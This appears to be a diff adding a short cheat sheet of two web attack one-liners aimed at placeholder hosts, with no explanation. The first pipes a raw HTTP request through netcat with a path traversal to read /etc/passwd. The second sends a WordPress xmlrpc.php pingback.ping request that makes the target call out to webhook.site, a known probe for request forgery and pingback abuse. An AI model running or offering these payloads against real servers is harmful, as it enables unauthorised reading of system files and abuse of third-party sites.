@@ -1,0 +1,11 @@
+echo -e "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1\r\nHost: x.x.x.x:80\r\nConnection: close\r\n\r\n" | nc x.x.x.x 80
+
+curl -ik "https://xxx/xmlrpc.php" --data '
+<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param><value><string>https://webhook.site</string></value></param>
+<param><value><string>https://xxx/</string></value></param>
+</params>
+</methodCall>'
